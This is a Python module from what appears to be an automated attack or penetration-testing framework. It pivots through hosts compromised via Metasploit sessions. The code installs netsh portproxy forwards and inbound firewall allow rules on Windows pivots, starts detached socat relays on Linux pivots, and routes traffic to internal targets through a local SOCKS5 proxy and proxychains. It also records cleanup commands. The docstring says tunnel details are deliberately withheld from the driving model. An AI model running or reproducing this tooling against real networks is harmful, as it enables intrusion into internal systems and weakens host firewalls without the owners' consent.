"""访问方向隧道：**跳板操作系统层面的转发** + 控制端一个映射用的小 SOCKS5。

为什么不用 msf 的 pivot（`socks_proxy` / `portfwd`）—— 实测 2026-10-07，本环境：
  * 刚起好的 `socks_proxy` + `route add` 是**能带货**的：经它发合法 SMB2 NEGOTIATE，
    `192.168.93.40:445` 回包 77 字节；msf 自己的 portscan 走 route 也是 `TCP OPEN`；
  * 但**用几下就死**：同一条代理在若干次连接之后开始一律 `Connection refused`
    （连我们自己那个刚成功的 python 探针也被拒）—— 每次连接占一个会话通道且不释放，
    通道耗尽后新连接全拒。这种"能通几次"的隧道不能当通用出入口；
  * 而**跳板操作系统层面**的转发不受此影响：`netsh portproxy` 的对照实验里 kali 真收到连接，
    它由跳板的 TCP 栈完成，不消耗会话通道；会话只用来"下命令把它装上"，而命令执行一直可靠。

分工（搭 / 用两件事）：
  * 搭 `arm()`：对每个 (目标地址, 端口) ——
      ① 跳板上系统转发接出来：Windows `netsh portproxy`（系统自带），Linux `socat`；
      ② 控制端写一条映射进 map 文件（小 SOCKS5 每次 CONNECT 都重读，映射可随时加）；
      ③ **数据级探针**：必须真的收回字节才算通（connect-only 探针会被各种中间态骗过）。
  * 用：`proxy_prefix()` 交给组织命令那一步（命令套 `proxychains4 -q -f <conf>`）。
    卡与模型都不知道代理端口（爷爷 2026-10-07：卡里不许出现隧道相关内容）。
"""
from __future__ import annotations

import json
import time

from runtime import artifacts
from runtime import harvest
from copy import deepcopy
from ipaddress import ip_address, ip_network
from uuid import uuid4


from .tunnel_proxy import (
    TUNNEL_PROXY_PORT, TUNNEL_BASE_PORT, conf_path, map_path, conf_body,
    proxy_prefix, proxy_argv, SOCKS5_MAPPER, ensure_local_proxy, _write_map,
    PROBE, data_probe,
)
from .tunnel_topology import (
    _windows_prefixes, _as_list, _prefix_from_mask, _json_documents,
    local_subnets, covering_subnets, probes_from_facts, targets_for,
)
from .tunnel_resources import record, rows, covers, local_listeners, free_ports, live


def pivot_forward_request(row, *, target, port, listen_port):
    """Render the declared operating system command as a command-category request."""
    platform = str(row.get("platform") or "").lower()
    if platform.startswith("windows"):
        command = (
            "netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=%s "
            "connectaddress=%s connectport=%s & netsh advfirewall firewall add rule "
            "name=agv-fwd-%s dir=in action=allow protocol=TCP localport=%s"
            % (listen_port, target, port, listen_port, listen_port))
    elif platform.startswith("linux"):
        command = (
            "(setsid nohup socat TCP-LISTEN:%s,fork,reuseaddr TCP:%s:%s "
            ">/tmp/agv_fwd_%s.log 2>&1 &); sleep 1; echo started"
            % (listen_port, target, port, listen_port))
    else:
        raise ValueError("TUNNEL_PLATFORM_UNDECLARED")
    return {"tool": "cmd", "cmd": command}


def init_for_session(executor, session_row, *, run_dir, targets, owner, node="",
                     control_host="", proxy_band=(TUNNEL_PROXY_PORT,),
                     listen_band=(TUNNEL_BASE_PORT, TUNNEL_BASE_PORT + 60),
                     timeout=60.0) -> dict:
    """Allocate the ports and arm the relay for one adopted session.

    Two things stay the caller's: the session's own success (this never rewrites it) and the
    decision to advance the band -- a real bind conflict is not distinguishable from any other
    flow failure inside `arm` yet, so this makes one attempt and reports what happened.
    """
    wanted = sorted({(str(ip_address(host)), int(port)) for host, port in targets})
    if not wanted:
        return {"state": "unknown", "reason": "TUNNEL_NO_TARGET"}
    pivot_host = str(session_row.get("host") or "")
    if not pivot_host:
        return {"state": "unknown", "reason": "TUNNEL_PIVOT_UNKNOWN"}
    if all(live(run_dir, host) for host, _port in wanted):
        #: a live relay already covers every wanted address -- arming another one would only
        #: install a second set of forwards for the same flow.
        return {"state": "completed", "reason": "TUNNEL_ALREADY_LIVE", "wanted": [list(i) for i in wanted]}
    listen_ports = free_ports(executor, run_dir, owner=owner, host=pivot_host,
                              band=range(listen_band[0], listen_band[1] + 1),
                              count=len(wanted), timeout=timeout)
    #: The control box's mapper is one shared listener for the whole run (`ensure_local_proxy` is
    #: idempotent), so an already-listening one is reused instead of hunted for in the band.
    band = [port for port in range(proxy_band[0], proxy_band[-1] + 1)]
    up = [port for port in band if port in local_listeners(executor, timeout=timeout)]
    proxy_port = up[0] if up else free_ports(
        executor, run_dir, owner=owner, host=control_host or pivot_host, band=band, count=1,
        local=bool(control_host), timeout=timeout)[0]
    listeners = {"%s:%d" % item: port for item, port in zip(wanted, listen_ports)}
    result = arm(executor, session_row, targets=[list(item) for item in wanted],
                 run_dir=run_dir, proxy_port=proxy_port, listeners=listeners, node=node,
                 timeout=timeout)
    started = [item for item in result.get("forwards") or [] if item.get("confirmed")]
    if result.get("state") != "completed" and not started:
        #: Nothing was installed, so nothing needs a cleanup receipt: hand the band back and say
        #: why. A run that *did* install a forward keeps its lease until that cleanup is confirmed.
        from runtime import session_registry
        try:
            session_registry.release_unstarted(
                run_dir, owner=owner,
                reason=str(result.get("reason") or "TUNNEL_FLOW_UNCONFIRMED"))
            result = dict(result, released=True)
        except (ValueError, OSError) as error:
            result = dict(result, released=False, release_error=type(error).__name__)
    return dict(result, reserved={"proxy_port": proxy_port, "listen_ports": listen_ports,
                                  "owner": owner})


def arm(executor, session_row, *, targets, run_dir, proxy_port, listeners,
        node="", timeout=60.0) -> dict:
    """Use explicitly assigned ports and an exact session binding."""
    from runtime import session_io
    if not str(session_row.get("session_id") or ""):
        return {"state": "unknown", "reason": "TUNNEL_SESSION_UNBOUND"}
    if type(proxy_port) is not int or not 1 <= proxy_port <= 65535:
        raise ValueError("TUNNEL_PROXY_PORT_UNDECLARED")
    wanted = sorted({(str(ip_address(host)), str(int(port))) for host, port in targets})
    if not wanted:
        return {"state": "unknown", "reason": "TUNNEL_NO_TARGET"}
    if not isinstance(listeners, dict):
        raise ValueError("TUNNEL_LISTENERS_UNDECLARED")
    ports = [listeners.get("%s:%s" % item) for item in wanted]
    if (any(type(port) is not int or not 1 <= port <= 65535 for port in ports)
            or len(set(ports)) != len(ports)):
        raise ValueError("TUNNEL_LISTENERS_UNDECLARED")
    mine = local_subnets(executor, session_row, timeout=timeout)
    reachable = [item for item in wanted
                 if any(ip_address(item[0]) in ip_network(subnet) for subnet in mine)]
    if not reachable:
        return {"state": "unknown", "reason": "TUNNEL_NO_OBSERVED_ROUTE",
                "local_subnets": mine, "wanted": wanted}
    ensure_local_proxy(executor, port=proxy_port, timeout=timeout)
    pivot_host = str(session_row.get("host") or "")
    mapping, forwards = {}, []
    for host, port in reachable:
        listen = listeners["%s:%s" % (host, port)]
        request = pivot_forward_request(session_row, target=host, port=port, listen_port=listen)
        platform = str(session_row.get("platform") or "").lower()
        undo = (["netsh", "interface", "portproxy", "delete", "v4tov4",
                 "listenaddress=0.0.0.0", "listenport=%s" % listen]
                if platform.startswith("windows") else
                ["pkill", "-f", "socat TCP-LISTEN:%s," % listen])
        artifacts.record(run_dir, kind="listener", host=pivot_host, node=node,
                         target=str(listen), detail="declared tunnel forward %s:%s" % (host, port),
                         state="declared", undo=undo)
        if platform.startswith("windows"):
            artifacts.record(run_dir, kind="firewall", host=pivot_host, node=node,
                             target="agv-fwd-%s" % listen, detail="declared tunnel firewall rule",
                             state="declared", undo=["netsh", "advfirewall", "firewall", "delete",
                                                      "rule", "name=agv-fwd-%s" % listen])
        done = session_io.call_bound(session_row, request, timeout)
        confirmed = done["confirmed"] and done["command_rc"] == 0
        forwards.append({"target": host, "port": port, "listen": listen,
                         "confirmed": confirmed, "command_rc": done["command_rc"]})
        if not done["confirmed"]:
            break
        if not confirmed:
            continue
        mapping[(host, port)] = listen
    _write_map(executor, {"%s:%s" % item: [pivot_host, listen]
                          for item, listen in mapping.items()}, timeout=timeout)
    proved = [item for item in sorted(mapping)
              if data_probe(executor, item[0], item[1], proxy_port=proxy_port, timeout=timeout)]
    ok = bool(proved)
    note = json.dumps({"session_id": session_row["session_id"],
                       "forwards": forwards, "proved": proved}, ensure_ascii=False)
    row = record(run_dir, session_row=session_row, mappings=mapping, proxy_port=proxy_port,
                 alive=ok, note=note)
    return {"state": "completed" if ok else "unknown", "row": row, "port": proxy_port,
            "proved": ["%s:%s" % item for item in proved], "forwards": forwards,
            "local_subnets": mine, "reason": "" if ok else "TUNNEL_FLOW_UNCONFIRMED"}


def reclaim(executor, run_dir, row, *, timeout=45.0) -> dict:
    """Close the resource only after every declared undo has completed."""
    from runtime import session_io
    binding = row.get("session_binding")
    if not isinstance(binding, dict) or not binding.get("session_id"):
        return {"state": "unknown", "reason": "TUNNEL_SESSION_UNBOUND", "removed": []}
    platform = str(binding.get("platform") or "").lower()
    taken, failed = [], []
    for item in row.get("tunnel_ports") or []:
        listen = str(item.get("listen") or "")
        if not listen.isdigit() or not 1 <= int(listen) <= 65535:
            failed.append({"listen": listen, "reason": "TUNNEL_PORT_INVALID"})
            continue
        if platform.startswith("windows"):
            requests = [
                {"tool": "tool", "name": "netsh", "args": ["interface", "portproxy", "delete",
                    "v4tov4", "listenaddress=0.0.0.0", "listenport=%s" % listen]},
                {"tool": "tool", "name": "netsh", "args": ["advfirewall", "firewall", "delete",
                    "rule", "name=agv-fwd-%s" % listen]},
            ]
        elif platform.startswith("linux"):
            requests = [{"tool": "tool", "name": "pkill",
                         "args": ["-f", "socat TCP-LISTEN:%s," % listen]}]
        else:
            failed.append({"listen": listen, "reason": "TUNNEL_PLATFORM_UNDECLARED"})
            continue
        try:
            results = []
            for request in requests:
                result = session_io.call_bound(binding, request, timeout)
                results.append(result)
                if not result["confirmed"]:
                    return {"state": "unknown", "reason": "TUNNEL_UNDO_UNCONFIRMED",
                            "removed": taken, "failed": [{"listen": listen}]}
            if all(result["confirmed"] and result["command_rc"] == 0 for result in results):
                taken.append(listen)
            else:
                failed.append({"listen": listen, "reason": "TUNNEL_UNDO_UNCONFIRMED"})
        except (ValueError, OSError) as error:
            failed.append({"listen": listen, "reason": str(error)})
    if failed:
        return {"state": "unknown", "reason": "TUNNEL_UNDO_UNCONFIRMED",
                "removed": taken, "failed": failed}
    cleared = executor(["python3", "-c", "import io;io.open(%r,'w').write('{}')" % map_path()], timeout)
    if getattr(cleared, "returncode", None) != 0 or getattr(cleared, "timed_out", False):
        return {"state": "unknown", "reason": "TUNNEL_MAP_CLEAR_UNCONFIRMED", "removed": taken}
    harvest.record(run_dir, "tunnel", {"kind": "closed", "parent": row["channel_id"],
                                       "at": time.time(), "note": "tunnel reclaimed"})
    return {"state": "completed", "removed": taken}
